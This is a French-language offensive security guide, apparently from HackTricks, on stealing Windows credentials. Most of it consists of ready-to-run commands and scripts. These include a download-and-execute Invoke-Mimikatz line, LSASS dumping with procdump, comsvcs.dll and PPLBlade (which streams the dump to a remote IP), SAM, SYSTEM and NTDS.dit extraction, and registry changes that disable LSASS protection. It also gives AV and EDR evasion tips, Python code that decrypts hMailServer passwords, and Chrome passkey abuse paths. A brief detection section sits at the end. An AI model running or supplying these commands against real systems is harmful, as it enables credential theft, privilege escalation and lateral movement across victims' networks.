# Vol de credentials Windows

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Découvrez d'autres fonctionnalités de Mimikatz sur** [**cette page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Découvrez certaines protections possibles des identifiants ici.**](credentials-protections.md) **Ces protections peuvent empêcher Mimikatz d’extraire certains identifiants.**

## Identifiants avec Meterpreter

Utilisez le [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** j’ai créé pour **rechercher des mots de passe et des hashes** sur la machine victime.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Contourner l'AV

### Procdump + Mimikatz

Comme **Procdump de** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**est un outil Microsoft légitime**, il n'est pas détecté par Defender.\
Vous pouvez utiliser cet outil pour **dump le processus lsass**, **télécharger le dump** et **extraire** les **identifiants localement** depuis le dump.

Vous pouvez également utiliser [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Ce processus est effectué automatiquement avec [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Note**: Certains **AV** peuvent **détecter** comme **malveillante** l'utilisation de **procdump.exe pour dumper lsass.exe**, car ils **détectent** les chaînes **"procdump.exe" et "lsass.exe"**. Il est donc plus **stealthy** de transmettre comme **argument** le **PID** de lsass.exe à procdump **plutôt que** le **nom lsass.exe.**

### Dumping lsass avec **comsvcs.dll**

Une DLL nommée **comsvcs.dll**, présente dans `C:\Windows\System32`, est responsable du **dump de la mémoire des processus** en cas de crash. Cette DLL inclut une **fonction** nommée **`MiniDumpW`**, conçue pour être invoquée avec `rundll32.exe`.\
Il est inutile d'utiliser les deux premiers arguments, mais le troisième est divisé en trois composants. Le premier composant correspond à l'ID du processus à dumper, le deuxième représente l'emplacement du fichier dump et le troisième est strictement le mot **full**. Aucune autre option n'est disponible.\
Après l'analyse de ces trois composants, la DLL est utilisée pour créer le fichier dump et y transférer la mémoire du processus spécifié.\
L'utilisation de **comsvcs.dll** est possible pour dumper le processus lsass, ce qui évite d'avoir à upload et à exécuter procdump. Cette méthode est décrite en détail sur [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

La commande suivante est utilisée pour l'exécution :
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Vous pouvez automatiser ce processus avec** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dump de lsass avec le Gestionnaire des tâches**

1. Faites un clic droit sur la barre des tâches, puis cliquez sur Gestionnaire des tâches
2. Cliquez sur Plus de détails
3. Recherchez le processus « Local Security Authority Process » dans l’onglet Processus
4. Faites un clic droit sur le processus « Local Security Authority Process », puis cliquez sur « Créer un fichier de vidage ».

### Dump de lsass avec procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) est un binaire signé par Microsoft qui fait partie de la suite [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dump de lsass avec PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) est un outil de dump de processus protégés qui prend en charge l’obfuscation du dump mémoire et son transfert vers des postes de travail distants sans l’écrire sur le disque.

**Fonctionnalités principales** :

1. Contournement de la protection PPL
2. Obfuscation des fichiers de dump mémoire pour échapper aux mécanismes de détection basés sur les signatures de Defender
3. Téléversement du dump mémoire avec les méthodes de téléversement RAW et SMB sans l’écrire sur le disque (dump fileless)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – dump LSASS basé sur SSP sans MiniDumpWriteDump

Ink Dragon fournit un dumper en trois étapes baptisé **LalsDumper** qui n'appelle jamais `MiniDumpWriteDump`, de sorte que les hooks EDR sur cette API ne se déclenchent jamais :<sup>[[3]](#references)</sup>

1. **Loader de l'étape 1 (`lals.exe`)** – recherche dans `fdp.dll` un placeholder composé de 32 caractères `d` minuscules, le remplace par le chemin absolu vers `rtu.txt`, enregistre la DLL modifiée sous le nom `nfdp.dll`, puis appelle `AddSecurityPackageA("nfdp","fdp")`. Cela force **LSASS** à charger la DLL malveillante comme nouveau Security Support Provider (SSP).
2. **Étape 2 dans LSASS** – lorsque LSASS charge `nfdp.dll`, la DLL lit `rtu.txt`, applique un XOR à chaque octet avec `0x20`, puis mappe le blob décodé en mémoire avant de transférer l'exécution.
3. **Dumper de l'étape 3** – le payload mappé réimplémente la logique de MiniDump à l'aide de **direct syscalls** résolus depuis des noms d'API hashés (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Un export dédié nommé `Tom` ouvre `%TEMP%\<pid>.ddt`, écrit un dump LSASS compressé dans le fichier, puis ferme le handle afin que l'exfiltration puisse avoir lieu ultérieurement.

Notes opérateur :

* Gardez `lals.exe`, `fdp.dll`, `nfdp.dll` et `rtu.txt` dans le même répertoire. L'étape 1 remplace le placeholder codé en dur par le chemin absolu vers `rtu.txt`; les séparer rompt la chaîne.
* L'enregistrement s'effectue en ajoutant `nfdp` à `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Vous pouvez initialiser vous-même cette valeur afin que LSASS recharge le SSP à chaque démarrage.
* Les fichiers `%TEMP%\*.ddt` sont des dumps compressés. Décompressez-les localement, puis transmettez-les à Mimikatz/Volatility pour l'extraction des credentials.
* L'exécution de `lals.exe` nécessite des droits admin/SeTcb pour que `AddSecurityPackageA` réussisse; une fois l'appel terminé, LSASS charge de manière transparente le SSP rogue et exécute l'étape 2.
* Supprimer la DLL du disque ne l'expulse pas de LSASS. Supprimez l'entrée du registre et redémarrez LSASS (reboot), ou laissez-la en place pour une persistence à long terme.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Extraire les secrets LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump de la NTDS.dit depuis le DC cible
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Extraire l'historique des mots de passe de NTDS.dit depuis le DC cible
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Afficher l’attribut pwdLastSet pour chaque compte NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Ces fichiers devraient se trouver dans _C:\windows\system32\config\SAM_ et _C:\windows\system32\config\SYSTEM._ Mais **vous ne pouvez pas simplement les copier de manière classique** car ils sont protégés.

### From Registry

Le moyen le plus simple de voler ces fichiers consiste à en obtenir une copie depuis le registre :
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Téléchargez** ces fichiers sur votre machine Kali et **extrayez les hashes** à l’aide de :
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Vous pouvez effectuer une copie de fichiers protégés à l’aide de ce service. Vous devez disposer des droits d’administrateur.

#### Utilisation de vssadmin

Le binaire vssadmin est uniquement disponible dans les versions de Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Mais vous pouvez faire la même chose depuis **Powershell**. Voici un exemple de **comment copier le fichier SAM** (le disque dur utilisé est « C: » et le fichier est enregistré dans C:\users\Public), mais vous pouvez l’utiliser pour copier n’importe quel fichier protégé :
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code du livre : [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Enfin, vous pouvez également utiliser le [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) pour créer une copie de SAM, SYSTEM et ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Credentials Active Directory - NTDS.dit**

Le fichier **NTDS.dit** est connu comme le cœur de **Active Directory**, car il contient des données essentielles sur les objets utilisateur, les groupes et leurs appartenances. C'est là que sont stockés les **password hashes** des utilisateurs du domaine. Ce fichier est une base de données **Extensible Storage Engine (ESE)** située à **_%SystemRoom%/NTDS/ntds.dit_**.

Trois tables principales sont conservées dans cette base de données :

- **Data Table** : cette table stocke les informations sur les objets tels que les utilisateurs et les groupes.
- **Link Table** : elle suit les relations, telles que les appartenances aux groupes.
- **SD Table** : les **security descriptors** de chaque objet y sont conservés afin d'assurer la sécurité et le contrôle d'accès aux objets stockés.

Plus d'informations à ce sujet : [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)<sup>[[8]](#references)</sup>

Windows utilise _Ntdsa.dll_ pour interagir avec ce fichier, et celui-ci est utilisé par _lsass.exe_. Ainsi, une **partie** du fichier **NTDS.dit** peut se trouver **dans la mémoire de `lsass`** (il est probablement possible d'y trouver les dernières données consultées grâce à l'amélioration des performances apportée par l'utilisation d'un **cache**).

#### Déchiffrement des hashes dans NTDS.dit

Le hash est chiffré 3 fois :

1. Déchiffrer la clé de chiffrement des mots de passe (**PEK**) à l'aide de **BOOTKEY** et de **RC4**.
2. Déchiffrer le **hash** à l'aide de **PEK** et de **RC4**.
3. Déchiffrer le **hash** à l'aide de **DES**.

**PEK** possède la **même valeur** sur **chaque contrôleur de domaine**, mais elle est **chiffrée** dans le fichier **NTDS.dit** à l'aide de la **BOOTKEY** du **fichier SYSTEM du contrôleur de domaine (elle est différente selon les contrôleurs de domaine)**. C'est pourquoi, pour récupérer les credentials depuis le fichier NTDS.dit, **vous avez besoin des fichiers NTDS.dit et SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copie de NTDS.dit à l'aide de Ntdsutil

Disponible depuis Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Vous pouvez également utiliser l’astuce [**volume shadow copy**](#stealing-sam-and-system) pour copier le fichier **ntds.dit**. N’oubliez pas que vous aurez également besoin d’une copie du **fichier SYSTEM** (là encore, [**extrayez-le du registre ou utilisez l’astuce volume shadow copy**](#stealing-sam-and-system)).

### **Extraction des hashes depuis NTDS.dit**

Une fois que vous avez **obtenu** les fichiers **NTDS.dit** et **SYSTEM**, vous pouvez utiliser des outils comme _secretsdump.py_ pour **extraire les hashes** :
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Vous pouvez également **les extraire automatiquement** à l’aide d’un utilisateur administrateur de domaine valide :
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Pour les fichiers **NTDS.dit volumineux**, il est recommandé de l'extraire avec [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Enfin, vous pouvez également utiliser le **metasploit module** : _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraction des objets de domaine depuis NTDS.dit vers une base de données SQLite**

Les objets NTDS peuvent être extraits vers une base de données SQLite avec [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Les secrets ne sont pas les seuls éléments extraits : les objets complets ainsi que leurs attributs le sont également, afin de permettre une extraction d'informations supplémentaire lorsque le fichier NTDS.dit brut a déjà été récupéré.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Le hive `SYSTEM` est facultatif, mais il permet le déchiffrement des secrets (hashes NT et LM, identifiants supplémentaires tels que les mots de passe en clair, clés Kerberos ou de confiance, historiques de mots de passe NT et LM). Entre autres informations, les données suivantes sont extraites : comptes utilisateur et machine avec leurs hashes, indicateurs UAC, horodatage de la dernière connexion et de la dernière modification du mot de passe, description des comptes, noms, UPN, SPN, groupes et appartenances récursives, arborescence des unités organisationnelles et appartenances, domaines approuvés avec le type, la direction et les attributs des relations de confiance...

## Lazagne

Téléchargez le binaire depuis [ici](https://github.com/AlessandroZ/LaZagne/releases). Vous pouvez utiliser ce binaire pour extraire des identifiants depuis plusieurs logiciels.
```
lazagne.exe all
```
## Other tools for extracting credentials from SAM and LSASS

### Windows credentials Editor (WCE)

Cet outil peut être utilisé pour extraire des identifiants de la mémoire. Téléchargez-le depuis : [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extraire les identifiants du fichier SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Extraire les identifiants du fichier SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Téléchargez-le depuis :[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) et **exécutez-le** : les mots de passe seront extraits.

## Exploitation des sessions RDP inactives et affaiblissement des contrôles de sécurité

Le RAT FinalDraft d’Ink Dragon inclut une tâche `DumpRDPHistory` dont les techniques sont utiles à tout red-teamer :<sup>[[3]](#references)</sup>

### Collecte de télémétrie de type DumpRDPHistory

* **Cibles RDP sortantes** – analysez chaque ruche utilisateur à l’emplacement `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Chaque sous-clé contient le nom du serveur, `UsernameHint` et l’horodatage de la dernière écriture. Vous pouvez reproduire la logique de FinalDraft avec PowerShell :

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Preuves de connexions RDP entrantes** – interrogez le journal `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pour les ID d’événement **21** (connexion réussie) et **25** (déconnexion), afin d’identifier les personnes ayant administré la machine :

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Une fois que vous savez quel Domain Admin se connecte régulièrement, dumpez LSASS (avec LalsDumper/Mimikatz) tant que sa session **déconnectée** existe encore. CredSSP + le fallback NTLM laissent leur vérificateur et leurs tokens dans LSASS, qui peuvent ensuite être rejoués via SMB/WinRM pour récupérer `NTDS.dit` ou établir une persistance sur les contrôleurs de domaine.

### Downgrades du registre ciblés par FinalDraft

Le même implant modifie également plusieurs clés du registre afin de faciliter le credential theft :<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Définir `DisableRestrictedAdmin=1` force la réutilisation complète des credentials/tickets lors d'une session RDP, permettant des pivots de type pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` désactive le filtrage des tokens UAC afin que les administrateurs locaux obtiennent des tokens sans restriction sur le réseau.
* `DSRMAdminLogonBehavior=2` permet à l'administrateur DSRM de se connecter lorsque le DC est en ligne, offrant aux attackers un autre compte intégré à privilèges élevés.
* `RunAsPPL=0` supprime les protections PPL de LSASS, rendant trivial l'accès à la mémoire pour des dumpers tels que LalsDumper.

## credentials de la base de données hMailServer (post-compromise)

hMailServer stocke le mot de passe de sa DB dans `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`, sous `[Database] Password=`. La valeur est chiffrée avec Blowfish à l'aide de la clé statique `THIS_KEY_IS_NOT_SECRET` et de permutations d'endianness sur des mots de 4 octets. Utilisez la chaîne hexadécimale de l'INI avec ce snippet Python :<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Avec le mot de passe en clair, copiez la base de données SQL CE pour éviter les verrous de fichier, chargez le provider 32 bits et mettez-le à niveau si nécessaire avant d’interroger les hashes :
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
La colonne `accountpassword` utilise le format de hash hMailServer (mode hashcat `1421`). Cracker ces valeurs peut fournir des identifiants réutilisables pour les pivots WinRM/SSH.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Certains outils capturent les **mots de passe de logon en plaintext** en interceptant le callback de logon LSA `LsaApLogonUserEx2`. L'idée consiste à hooker ou wrapper le callback du package d'authentification afin que les identifiants soient capturés **pendant le logon** (avant le hashing), puis écrits sur le disque ou renvoyés à l'opérateur. Cette technique est généralement implémentée sous la forme d'un helper qui s'injecte dans LSA ou s'y enregistre, puis consigne chaque événement de logon interactif/réseau réussi avec le nom d'utilisateur, le domaine et le mot de passe.<sup>[[1]](#references)</sup>

Notes opérationnelles :
- Nécessite les privilèges d'administrateur local/SYSTEM pour charger le helper dans le chemin d'authentification.
- Les identifiants capturés apparaissent uniquement lorsqu'un logon a lieu (logon interactif, RDP, service ou réseau selon le hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) stocke les informations de connexion sauvegardées dans un fichier `sqlstudio.bin` propre à chaque utilisateur. Des dumpers dédiés peuvent analyser le fichier et récupérer les identifiants SQL sauvegardés. Dans les shells qui ne renvoient que la sortie des commandes, le fichier est souvent exfiltré en l'encodant en Base64 et en l'affichant sur stdout.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Côté opérateur, reconstruisez le fichier et exécutez le dumper localement pour récupérer les identifiants :
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Vol de credentials Passkeys / WebAuthn depuis Chrome sur Windows

Si une **exécution de code** est obtenue en tant qu’**utilisateur victime** sur un hôte Windows utilisant **Chrome + des passkeys synchronisées par Google Password Manager**, les passkeys deviennent une cible intéressante de post-exploitation, même **sans privilèges admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Artefacts locaux intéressants
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** stocke des enregistrements **`WebauthnCredentialSpecifics`** encodés au format protobuf. Un processus exécuté par le même utilisateur peut énumérer l’**RP ID**, le **nom d’utilisateur**, l’**ID d’identifiant** et le matériel de clé privée chiffré des passkeys synchronisées.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** stocke l’état local d’inscription de l’appareil, notamment **`wrapped_identity_private_key`** et le secret encapsulé utilisé pour récupérer les identifiants synchronisés.<sup>[[4]](#references)</sup>

Triage rapide :
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### Les blobs de clés liés au TPM peuvent toujours être détournés comme oracle de signature local

Si le navigateur exporte une clé d'identité adossée au TPM sous forme de **`NCRYPT_OPAQUE_KEY_BLOB`** et stocke ce blob dans un état accessible à l'utilisateur, le malware n'a pas besoin d'extraire la clé privée brute. Il peut simplement réimporter le blob sur la **même machine** et demander au TPM local de signer des données contrôlées par l'attaquant :<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Cela signifie que le **hardware binding empêche l’export hors appareil, mais pas l’utilisation par le même utilisateur sur l’endpoint compromis**.

### Voies d’abus pratiques

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- Énumérer `WebauthnCredentialSpecifics` depuis le LevelDB de Chrome.
- Démarrer une connexion avec un passkey et obtenir un nouveau challenge WebAuthn.
- Utiliser le blob `wrapped_identity_private_key` volé sur le TPM de la victime pour signer le binding de la requête du cloud-authenticator.
- Relayer l’assertion renvoyée au relying party.
- Cette technique est particulièrement utile lorsque le RP accepte `userVerification=preferred` ou ne rejette pas les assertions avec **`UV=0`**.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- Forcer une nouvelle phase d’onboarding en supprimant `passkey_enclave_state` ou en envoyant une opération `device/forget` signée et valide.
- Si l’onboarding laisse l’appareil dans l’état **`uv_key_pending`**, enregistrer une clé publique UV contrôlée par l’attaquant.
- Si le fournisseur ne vérifie pas l’attestation / l’origine du secure hardware pour la nouvelle clé UV, les signatures ultérieures de la clé de l’attaquant sont traitées comme **`UV=1`**.
3. **Vol du master-secret / SDS recovery**<sup>[[4]](#references)</sup>
- Forcer la récupération ou la réintégration afin que Chrome récupère le master secret des passkeys synchronisés.
- Surveiller la recréation ou la modification de `passkey_enclave_state`, puis effectuer un dump de la mémoire de Chrome lorsque le **security domain secret (SDS)** en clair y est présent.
- Utiliser le SDS récupéré pour déchiffrer les champs chiffrés de chaque enregistrement `WebauthnCredentialSpecifics` et récupérer les clés privées WebAuthn portables.

### Idées pour le DFIR / la détection

- Surveiller la **suppression/recréation** de `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Déclencher une alerte en cas d’accès anormal à **`Sync Data\LevelDB`** de Chrome par des processus autres que le navigateur.
- Déclencher une alerte en cas de **dumps de la mémoire de Chrome** ou d’accès inter-processus suspect à la mémoire.
- Examiner les demandes répétées de **Google Password Manager recovery PIN** ou toute nouvelle phase d’onboarding inattendue.
- Garder à l’esprit que le **`signCount`** de WebAuthn n’est souvent pas utile pour les passkeys synchronisés, car il peut rester constant ; la détection classique des clones est donc limitée.

## Références

- [1] [Unit 42 – Une enquête sur des années d’opérations non détectées ciblant des secteurs de haute valeur](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo : phishing par macro VBA Word via SMTP → déchiffrement des credentials hMailServer → Veeam CVE-2023-27532 vers SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – À l’intérieur d’Ink Dragon : révélation du relay network et du fonctionnement interne d’une opération offensive furtive](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey : une nouvelle surface d’attaque dans l’authentification passwordless](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / stockage des clés CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows : Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Comment fonctionne réellement le magasin de données Active Directory : à l’intérieur de NTDS.dit (Partie 1)](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

{{#include ../../banners/hacktricks-training.md}}
